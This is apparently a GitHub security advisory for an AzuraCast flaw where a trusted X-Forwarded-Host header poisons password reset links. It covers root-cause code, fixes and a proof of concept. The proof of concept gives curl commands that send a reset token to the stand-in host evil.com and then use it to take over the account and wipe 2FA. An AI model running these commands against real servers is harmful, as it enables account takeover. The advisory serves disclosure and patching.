# [H] AzuraCast has Password Reset Poisoning via Untrusted X-Forwarded-Host Header that Leads to Account Takeover and 2FA Bypass

## Summary
Severity: High
Advisory: GHSA-gv7r-3mr9-h5x8
CVE: CVE-2026-42606
CWE: CWE-640
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-gv7r-3mr9-h5x8
Type: github-advisory

## Affected
- Packagist: `azuracast/azuracast` — affected >=0 <0.23.6

## Details
## Summary

The `ApplyXForwarded` middleware unconditionally trusts the client-supplied `X-Forwarded-Host` HTTP header with no trusted proxy allowlist. An unauthenticated attacker can poison the password reset URL sent to any user by injecting this header when triggering the forgot-password flow. When the victim clicks the poisoned link, their reset token is exfiltrated to the attacker's server. The attacker then uses the token on the real instance to reset the victim's password and destroy their 2FA configuration, achieving full account takeover.

## Details

### Root Cause 1: Unconditional X-Forwarded-Host Trust

`backend/src/Middleware/ApplyXForwarded.php:35-40`:
```php
if ($request->hasHeader('X-Forwarded-Host')) {
    $hasXForwardedHeader = true;
    $xfHost = Types::stringOrNull($request->getHeaderLine('X-Forwarded-Host'), true);
    if (null !== $xfHost) {
        $uri = $uri->withHost($xfHost);
    }
}
```

There is no validation that the request originates from a trusted reverse proxy. Any direct client can set this header and it will be accepted.

In the default Docker deployment, nginx's PHP location block (`util/docker/web/nginx/azuracast.conf.tmpl:150-171`) uses `fastcgi_pass` with `include fastcgi_params`. Standard nginx behavior passes all client HTTP headers through to PHP-FPM as `HTTP_*` parameters. The `proxy_params.conf` file — which explicitly sets `X-Forwarded-For`, `X-Forwarded-Proto`, and `X-Forwarded-Port` — only applies to `proxy_pass` directives (websocket and vite dev server), NOT to the `fastcgi_pass` PHP handler. Therefore, client-supplied `X-Forwarded-Host` reaches PHP unmodified.

### Root Cause 2: Request Host Used for Security-Critical URLs

`backend/src/Http/Router.php:53-77` in `buildBaseUrl()`:
```php
$useRequest ??= $settings->prefer_browser_url; // default: true

// ...
if ($useRequest || $baseUrl->getHost() === '') {
    $ignoredHosts = ['web', 'nginx', 'localhost'];
    if (!in_array($currentUri->getHost(), $ignoredHosts, true)) {
        $baseUrl = (new Uri())
            ->withScheme($currentUri->getScheme())
            ->withHost($currentUri->getHost())
            ->withPort($currentUri->getPort());
    }
}
```

With `prefer_browser_url = true` (the default at `backend/src/Entity/Settings.php:109`), the request URI host — already poisoned by `ApplyXForwarded` — is used as the base URL for generating absolute URLs. Even if a `base_url` is configured in settings, it is overridden by the poisoned request host.

### Root Cause 3: Password Reset Generates Absolute URL

`backend/src/Controller/Frontend/Account/ForgotPasswordAction.php:72-77`:
```php
$router = $request->getRouter();
$url = $router->named(
    routeName: 'account:login-token',
    routeParams: ['token' => $token],
    absolute: true
);
```

This URL is embedded in the password reset email sent to the victim.

### Root Cause 4: Reset Token Wipes 2FA

`backend/src/Controller/Frontend/Account/LoginTokenAction.php:74-75`:
```php
$user->setNewPassword($data['password']);
$user->two_factor_secret = null;
```

When a `ResetPassword` token is consumed, the user's 2FA secret is unconditionally destroyed.

## PoC

**Prerequisites:** An AzuraCast instance with a user account (e.g., `admin@target.com`) that has 2FA enabled. Attacker controls `evil.com` with a web server that logs incoming requests.

### Step 1: Trigger poisoned password reset

```bash
curl -X POST https://target.azuracast.example/forgot \
  -H "X-Forwarded-Host: evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@target.com"
```

**Expected result:** The password reset email sent to `admin@target.com` contains a URL like:
```
https://evil.com/login-token/abc123def456...
```

### Step 2: Capture the token

When the victim clicks the link in their email, their browser navigates to `https://evil.com/login-token/abc123def456...`. The attacker's web server at `evil.com` captures the full URL path, extracting the token `abc123def456...`.

### Step 3: Use token on real instance

```bash
# First, GET the reset page to obtain CSRF token
curl -c cookies.txt https://target.azuracast.example/login-token/abc123def456...

# Extract CSRF token from response, then POST new password
curl -b cookies.txt -X POST https://target.azuracast.example/login-token/abc123def456... \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrf=<extracted_csrf_token>&password=AttackerPassword123"
```

**Result:** The victim's password is changed to `AttackerPassword123` and their 2FA is destroyed (`two_factor_secret = null`). The attacker is logged in with full access.

## Impact

- **Full account takeover** of any user account, including administrators, without any prior authentication
- **2FA bypass** — the password reset flow unconditionally destroys 2FA configuration, negating its security benefit
- **Administrative compromise** — if the target is an admin account, the attacker gains full control of the AzuraCast instance, including all stations, media, and system settings
- The attack requires the victim to click a link in a legitimate-looking password reset email from the real AzuraCast mail system, which increases the likelihood of success

## Recommended Fix

**Fix 1 (Primary): Validate X-Forwarded-Host against a trusted proxy allowlist**

In `backend/src/Middleware/ApplyXForwarded.php`, only apply `X-Forwarded-*` headers when the request originates from a trusted proxy (e.g., the Docker-internal nginx):

```php
// Add trusted proxy check
$trustedProxies = ['127.0.0.1', '::1', 'nginx', 'web'];
$remoteAddr = $request->getServerParams()['REMOTE_ADDR'] ?? '';

if (!in_array($remoteAddr, $trustedProxies, true)) {
    return $handler->handle($request);
}

// ... existing X-Forwarded-* processing
```

**Fix 2 (Defense in depth): Use configured base URL for security-critical emails**

In `ForgotPasswordAction.php`, generate the reset URL using the configured `base_url` setting rather than the request-derived URL:

```php
$router = $request->getRouter();
$url = $router->named(
    routeName: 'account:login-token',
    routeParams: ['token' => $token],
    absolute: true,
    // Force use of configured base URL, not request host
);
```

Or modify `Router::buildBaseUrl()` to never use request-derived hosts for absolute URLs by adding an option to force the configured base URL.

**Fix 3 (Defense in depth): Don't wipe 2FA on password reset**

In `LoginTokenAction.php:75`, remove the line `$user->two_factor_secret = null;`. If 2FA recovery is needed, it should be a separate, explicit flow — not a side effect of password reset.

## References
- https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-gv7r-3mr9-h5x8
- https://nvd.nist.gov/vuln/detail/CVE-2026-42606
- https://github.com/AzuraCast/AzuraCast/commit/7c622a18b451533de317e53862b1f84acf4efd85
- https://github.com/AzuraCast/AzuraCast
- https://github.com/AzuraCast/AzuraCast/releases/tag/0.23.6
